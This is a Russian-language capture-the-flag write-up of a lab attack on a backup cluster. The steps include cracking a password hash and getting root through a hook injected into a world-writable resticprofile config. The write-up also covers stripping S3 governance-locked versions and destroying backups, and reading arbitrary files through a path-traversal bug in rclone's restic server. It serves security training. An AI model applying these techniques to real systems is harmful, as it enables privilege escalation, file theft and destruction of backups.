# Flack Safety (fullpwn, diff 3) — evidence reconstruction

> Источник: сохранённые технические заметки и локальные файлы исследования.
> Ниже собраны проверенные live-тестами фрагменты. Вся топология стенда получена
> чтением `/entrypoint.sh` контейнера `backups-server` через произвольное чтение
> ФС изнутри rclone (см. шаги). Оригинальных манифестов deployment/values на
> диске нет; `fullpwn.flacksafety.zip` (раздатка) содержит только `shadow.txt`.

## 0. Раздатка
- `files/fullpwn-flacksafety/shadow.txt` (128 B):
  `employee:$argon2id$v=19$m=65536,t=3,p=1$...$...`
- Разбор: `argon2id` → пароль `employee` = `<PW>` (проверено локально).
- SSH нога: `employee@<workstation>:22` (рабочая станция в кластере).

## 1. Условие и чекер (6 стадий)
Чекер — HTTP `backups-checker:8080`, исходник скачивается как `/main.rs` (GET /main.rs).
Стадии считаются destroyed, если `restic find security_footage.mp4` вернул 0/10/12
(имя файла не найдено).

| # | Стадия | repo/путь (RESTIC_PASSWORD=<PW>) | Статус |
|---|--------|-------------------------------------------|--------|
| 1 | User Local Backup | `sftp:root@backups-workstation:/home/employee/backups` | destroyed |
| 2 | Root Local Backup | `sftp:root@backups-workstation:/backups` | destroyed |
| 3 | Offsite Replica | `/data/offsite/footage` (prune раз в мин) | destroyed |
| 4 | S3 Governance | bucket `footage` versitygw `:7070`, object-lock GOVERNANCE/3650d | destroyed |
| 5 | Rclone Remote 1 | `/data/rclone/workstation/footage` | destroyed |
| 6 | **Old Rclone Remote** | `/data/rclone/workstation-legacy` | **intact (не закрыта)** |

Стадия 6 = рекурсивный `has_files("/data/rclone/workstation-legacy")`: Intact при
любом entry (regular/symlink/непустой каталог); Destroyed только если пуст или
NotFound; `Err(_) => Unknown`.

## 2. Entrypoint (полный текст, секреты замаскированы)
Прочитан из контейнера `backups-server` (root backend rclone = `/data/rclone`):

```
#!/bin/sh
set -eu
export RESTIC_PASSWORD=<PW> AWS_DEFAULT_REGION=us-east-1 \
  AWS_ENDPOINT_URL=http://127.0.0.1:7070 AWS_ACCESS_KEY_ID=flack AWS_SECRET_ACCESS_KEY=<masked>
mkdir -p /data/s3 /data/s3-versions
install -d -m 700 /data/offsite
install -d -o rclonebk /data/rclone
htpasswd -cbB /etc/htpasswd workstation <PW>
htpasswd -bB /etc/htpasswd workstation-legacy "$LEGACY_REST_PASSWORD"
ROOT_ACCESS_KEY=flack ROOT_SECRET_KEY=<masked> versitygw --port :7070 posix --versioning-dir /data/s3-versions /data/s3 &
/usr/sbin/sshd -f /dev/null -o ListenAddress=127.0.0.1:2200 -o AllowUsers=rclonebk -o 'Subsystem sftp internal-sftp'
rclone serve restic ":sftp,host=127.0.0.1,port=2200,user=rclonebk,pass=$(rclone obscure rclonebk):/data/rclone" \
  --addr :8000 --htpasswd /etc/htpasswd --private-repos --cache-objects=false &
rclone serve restic /data/offsite --addr :8001 --htpasswd /etc/htpasswd --append-only --cache-objects=false &
for port in 7070 8000 8001; do until nc -z 127.0.0.1 $port; do sleep 1; done; done
seed() { restic -r "$1" init && restic -r "$1" backup --host workstation /home/employee/footage; }
if [ ! -e /data/seeded ]; then
  aws s3api create-bucket --bucket footage --object-lock-enabled-for-bucket
  aws s3api put-object-lock-configuration --bucket footage --object-lock-configuration \
    '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"GOVERNANCE","Days":3650}}}'
  seed s3:http://127.0.0.1:7070/footage
  seed rest:http://workstation:<PW>@127.0.0.1:8000/workstation/footage
  seed rest:http://workstation:<PW>@127.0.0.1:8001/footage
  seed "rest:http://workstation-legacy:$LEGACY_REST_PASSWORD@127.0.0.1:8000/workstation-legacy/footage"
  touch /data/seeded
fi
while sleep 60; do restic -r /data/offsite/footage forget --keep-last 2 --prune || true; done
```

Ключевое: ВСЕ репо (включая legacy) засеяны с `RESTIC_PASSWORD=<PW>`.
REST-пароль пользователя `workstation-legacy` — переменная окружения k8s-пода
`$LEGACY_REST_PASSWORD` (bcrypt в /etc/htpasswd, plaintext не хранится).

## 3. Foothold + governance (стадии 1–5)
1. `/etc/resticprofile/profiles.yaml` имеет права `rw-rw-rw-` (world-writable).
   В `base.backup` добавлялся хук `run-before`:
   ```
   run-before:
     - sh -c "id > /tmp/rootwhoami; cp /etc/crontabs/root /tmp/rootcron 2>/dev/null;
              chmod 644 /tmp/rootcron 2>/dev/null; chmod -R a+rX /backups 2>/dev/null; true"
   ```
   Cron `* * * * * resticprofile root.backup` исполняется supercronic от root → root RCE.
2. Из root-env получены креды: `AWS_ACCESS_KEY_ID=flack`, AWS secret, `RESTIC_REST_USERNAME=workstation`,
   `RESTIC_REST_PASSWORD=<PW>`, `RESTIC_PASSWORD=<PW>`.
3. Удалён `~/footage/security_footage.mp4`, отпрунены репо; в S3 пакетно удалены
   все non-latest версии (`delete-objects` + `--bypass-governance-retention`).
4. Дашборд: 5/6 destroyed, FLAG_1 = `PP{<FLAG>}` (принят).

## 4. Стадия 6 — разбор (live, HTTPS к rclone v1.74.3)
- CVE-2026-59733 / GHSA-fqj9-69pf-6pjg подтверждена: `POST/GET/DELETE` файлов по
  `workstation/../<sibling>/...` обходят `checkPrivate` (basic auth `workstation:<PW>`, `--path-as-is`).
- Произвольное чтение rootfs `backups-server`: `GET /workstation/../../..` + v2 headers
  → чтение `/etc/passwd` (uid 1000 `rclonebk`, home `/data/rclone`), `/entrypoint.sh`,
  `/etc/htpasswd`, `/data/rclone/workstation-legacy/footage/config` (155 B, restic-v2).
- Листинг за пределами user-дерева НЕ работает: всегда `200 []` (даже несуществующие),
  без слэша 500. Причина (исходник rclone v1.74.3): `sftp/local.List` отдаёт готовый
  `entry.Remote()`, а REST `filterDir` сравнивает с сырым `workstation/../...` → всё отсекается.
- Fullwidth `．．` (U+FF0E) — не работает (config 404). `.rclonelink` symlink-alias — не работает
  (сервер без `--links`). DELETE каталога → 404. `/proc/*/{environ,mountinfo,cmdline}` пустые/404.
- k8s SA-токен не смонтирован ни в backups-server, ни в backups-workstation
  (`/var/run/secrets/kubernetes.io/serviceaccount` → 404). `/root/.kube/config` → 500 (uid 1000).
- SSH/sftp порт 2200 слушает только 127.0.0.1 внутри пода (снаружи CLOSED).
- Подбор `LEGACY_REST_PASSWORD` исчерпан и остановлен: rockyou 14.3M (john 8 fork) → 0;
  тематические ~37k → 0. bcrypt на CPU ~385 H/s.

## 5. Вердикт
`has_files` требует полностью пустой каталог; удалять файлы по известному имени
везде можно, но перечислить каталог нельзя (имена — хэши), каталоги не удаляются.
Блокер = `LEGACY_REST_PASSWORD`. На момент сдачи стенд остановлен (весь кластер
`<CTF_NET>/16` недоступен, `nc <workstation>:22` → timeout). Итог: 5/6, FLAG_1 получен,
стадия 6 не закрыта. (Полный хронологический диалог с деталями всех проверок —
в исходном Git-диалоге; этот файл — сводка для публикации без живых реквизитов.)